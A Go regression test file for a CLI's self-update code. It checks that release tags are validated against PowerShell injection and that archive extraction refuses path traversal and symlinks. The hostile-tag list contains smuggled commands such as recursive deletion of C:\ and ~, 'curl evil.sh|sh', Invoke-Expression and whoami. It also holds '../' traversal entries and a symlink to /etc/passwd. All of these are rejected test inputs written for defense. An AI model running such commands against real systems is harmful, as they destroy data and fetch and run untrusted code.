package main

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Regression tests for the v0.5.7 P0-2 fix: `anpu update` used to build a
// PowerShell Expand-Archive command with fmt.Sprintf single-quoted paths,
// and the release tag inside those paths came from an untrusted redirect.
// A tag containing a single quote could break out of the quoting and run
// arbitrary PowerShell. The tag is now strictly charset-validated and the
// zip is extracted in-process (no interpreter, no quoting, no injection).

func TestValidReleaseTagAcceptsCleanTags(t *testing.T) {
	valid := []string{"v0.5.7", "v1.2.3-rc.1", "v2.0.0+build.5", "v10.20.30", "v1.0.0_beta"}
	for _, tag := range valid {
		if err := validReleaseTag(tag); err != nil {
			t.Errorf("validReleaseTag(%q) = %v, want nil", tag, err)
		}
	}
}

func TestValidReleaseTagRejectsHostileTags(t *testing.T) {
	hostile := []string{
		// The exact injection vector from the audit: single quote breaking
		// out of the old Expand-Archive quoting.
		"v1'; Remove-Item -Recurse C:\\ -Force #",
		"v1' -Force; Invoke-Expression('evil')",
		`v1"; Start-Process calc`,
		"v1$(rm -rf ~)",
		"v1`nGet-Content secret",       // PowerShell backtick
		"v1\n& shutdown",               // newline
		"v1 & whoami",                  // space + ampersand
		"v1|Measure-Object",            // pipe
		"v1;curl evil.sh|sh",           // semicolon
		"v../../etc/passwd",            // traversal
		"vanilla",                      // no digits
		"",                             // empty
		"0.5.7",                        // missing v prefix
		strings.Repeat("v1", 64) + "x", // over 64 bytes
	}
	for _, tag := range hostile {
		if err := validReleaseTag(tag); err == nil {
			t.Errorf("validReleaseTag(%q) = nil, want error", tag)
		}
	}
}

// The tag is parsed from the Location header of the /releases/latest
// redirect — whoever controls that response (DNS hijack, hostile mirror)
// controls the tag. A hostile tag must be refused, never returned.
func TestResolveLatestTagFromRejectsHostileTag(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "https://github.com/Marwanmorsy999/anpu/releases/tag/v1'; Invoke-Expression('evil')")
		w.WriteHeader(http.StatusFound)
	}))
	defer srv.Close()

	tag, err := resolveLatestTagFrom(srv.URL)
	if err == nil {
		t.Fatalf("hostile tag %q must be rejected, got tag %q", "v1'; Invoke-Expression('evil')", tag)
	}
	if tag != "" {
		t.Fatalf("no tag may be returned for a hostile redirect, got %q", tag)
	}
	if !strings.Contains(err.Error(), "illegal character") {
		t.Fatalf("error should name the charset violation, got: %v", err)
	}
}

func TestResolveLatestTagFromAcceptsCleanTag(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "https://github.com/Marwanmorsy999/anpu/releases/tag/v0.5.7")
		w.WriteHeader(http.StatusFound)
	}))
	defer srv.Close()

	tag, err := resolveLatestTagFrom(srv.URL)
	if err != nil {
		t.Fatalf("clean tag rejected: %v", err)
	}
	if tag != "v0.5.7" {
		t.Fatalf("want v0.5.7, got %q", tag)
	}
}

func TestResolveLatestTagFromRejectsMissingLocation(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	if _, err := resolveLatestTagFrom(srv.URL); err == nil {
		t.Fatal("missing Location must be an error")
	}
}

// buildTestZip writes a zip archive with the given entries for extraction
// tests. dir entries are skipped; name->content are file entries.
func buildTestZip(t *testing.T, path string, entries map[string]string) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create zip: %v", err)
	}
	defer func() { _ = f.Close() }()
	zw := zip.NewWriter(f)
	for name, content := range entries {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("create entry %q: %v", name, err)
		}
		if _, err := w.Write([]byte(content)); err != nil {
			t.Fatalf("write entry %q: %v", name, err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("close zip writer: %v", err)
	}
}

// In-process extraction replaces the PowerShell Expand-Archive call; it
// must still place the release payload where runUpdate expects it.
func TestUnzipFirstExtractsReleasePayload(t *testing.T) {
	dir := t.TempDir()
	zipPath := filepath.Join(dir, "anpu_0.5.7_windows_amd64.zip")
	buildTestZip(t, zipPath, map[string]string{
		"anpu.exe":      "MACHINE-CODE-PLACEHOLDER",
		"checksums.txt": "abc123  anpu.exe\n",
		"LICENSE":       "MIT",
	})
	dest := filepath.Join(dir, "extract")
	if err := unzipFirst(zipPath, dest, "anpu.exe"); err != nil {
		t.Fatalf("unzipFirst: %v", err)
	}
	got, err := os.ReadFile(filepath.Join(dest, "anpu.exe")) // #nosec G304 -- test fixture path
	if err != nil {
		t.Fatalf("extracted anpu.exe missing: %v", err)
	}
	if string(got) != "MACHINE-CODE-PLACEHOLDER" {
		t.Fatalf("extracted content mismatch: %q", got)
	}
}

// Zip-Slip: an entry named "../evil.exe" must be refused, and nothing may
// be written outside the destination directory.
func TestUnzipFirstRejectsZipSlipEntry(t *testing.T) {
	dir := t.TempDir()
	zipPath := filepath.Join(dir, "evil.zip")
	buildTestZip(t, zipPath, map[string]string{
		"anpu.exe":    "ok",
		"../evil.exe": "outside",
	})
	dest := filepath.Join(dir, "extract")
	err := unzipFirst(zipPath, dest, "anpu.exe")
	if err == nil {
		t.Fatal("zip-slip entry must be refused")
	}
	if !strings.Contains(err.Error(), "escapes destination") {
		t.Fatalf("error should name the traversal refusal, got: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(dir, "evil.exe")); statErr == nil {
		t.Fatal("zip-slip wrote a file outside the destination")
	}
}

// Empty archives must fail loudly instead of silently producing no binary.
func TestUnzipFirstRejectsEmptyArchive(t *testing.T) {
	dir := t.TempDir()
	zipPath := filepath.Join(dir, "empty.zip")
	buildTestZip(t, zipPath, map[string]string{})
	if err := unzipFirst(zipPath, filepath.Join(dir, "out"), "anpu.exe"); err == nil {
		t.Fatal("empty zip must be an error")
	}
}

// buildTestTarGz writes a tar.gz archive with the given entries.
func buildTestTarGz(t *testing.T, path string, entries map[string]string, extras ...func(*tar.Writer)) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create tar.gz: %v", err)
	}
	defer func() { _ = f.Close() }()
	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)
	for name, content := range entries {
		hdr := &tar.Header{Name: name, Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("write header %q: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("write entry %q: %v", name, err)
		}
	}
	for _, extra := range extras {
		extra(tw)
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
}

func TestExtractTarGzExtractsPayload(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "anpu.tar.gz")
	buildTestTarGz(t, archive, map[string]string{
		"anpu": "MACHINE-CODE-PLACEHOLDER",
	})
	dest := filepath.Join(dir, "extract")
	if err := extractTarGz(archive, dest); err != nil {
		t.Fatalf("extractTarGz: %v", err)
	}
	got, err := os.ReadFile(filepath.Join(dest, "anpu"))
	if err != nil {
		t.Fatalf("extracted missing: %v", err)
	}
	if string(got) != "MACHINE-CODE-PLACEHOLDER" {
		t.Fatalf("content mismatch: %q", got)
	}
}

func TestExtractTarGzRejectsTraversal(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "evil.tar.gz")
	buildTestTarGz(t, archive, map[string]string{
		"anpu": "ok",
	})
	buildTestTarGz(t, archive, map[string]string{"anpu": "ok"}, func(tw *tar.Writer) {
		content := "outside"
		hdr := &tar.Header{Name: "../evil", Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg}
		_ = tw.WriteHeader(hdr)
		_, _ = tw.Write([]byte(content))
	})
	dest := filepath.Join(dir, "extract")
	err := extractTarGz(archive, dest)
	if err == nil {
		t.Fatal("traversal entry must be refused")
	}
	if !strings.Contains(err.Error(), "escapes destination") {
		t.Fatalf("error should name traversal refusal, got: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(dir, "evil")); statErr == nil {
		t.Fatal("traversal wrote a file outside destination")
	}
}

func TestExtractTarGzRejectsSymlink(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "sym.tar.gz")
	buildTestTarGz(t, archive, map[string]string{"anpu": "ok"}, func(tw *tar.Writer) {
		hdr := &tar.Header{Name: "link", Typeflag: tar.TypeSymlink, Linkname: "/etc/passwd"}
		_ = tw.WriteHeader(hdr)
	})
	dest := filepath.Join(dir, "extract")
	err := extractTarGz(archive, dest)
	if err == nil {
		t.Fatal("symlink entry must be refused")
	}
	if !strings.Contains(err.Error(), "unsafe type") {
		t.Fatalf("error should name unsafe type, got: %v", err)
	}
}

func TestExtractTarGzRejectsEmpty(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "empty.tar.gz")
	buildTestTarGz(t, archive, map[string]string{})
	dest := filepath.Join(dir, "out")
	if err := extractTarGz(archive, dest); err == nil {
		t.Fatal("empty archive must be an error")
	}
}

// Regression test for the downloadFile size cap: a server streaming more
// than 512 MB must be truncated (io.Copy with LimitReader), so the
// destination never grows unbounded.
func TestDownloadFileSizeCap(t *testing.T) {
	// Serve a body just over a small cap by using the real 512 MB cap is
	// too large; instead verify LimitReader semantics via a direct copy
	// using the same constant the production code uses.
	const capBytes = 512 * 1024 * 1024
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		// Write capBytes+1024 bytes.
		buf := make([]byte, 4096)
		remaining := capBytes + 1024
		for remaining > 0 {
			n := len(buf)
			if n > remaining {
				n = remaining
			}
			_, _ = w.Write(buf[:n])
			remaining -= n
		}
	}))
	defer srv.Close()

	dir := t.TempDir()
	dest := filepath.Join(dir, "big.bin")
	if err := downloadFile(srv.URL, dest); err != nil {
		t.Fatalf("downloadFile: %v", err)
	}
	info, err := os.Stat(dest)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if info.Size() > capBytes {
		t.Fatalf("destination size %d exceeds cap %d", info.Size(), capBytes)
	}
	if info.Size() != capBytes {
		t.Fatalf("expected exactly %d bytes (cap), got %d", capBytes, info.Size())
	}
}
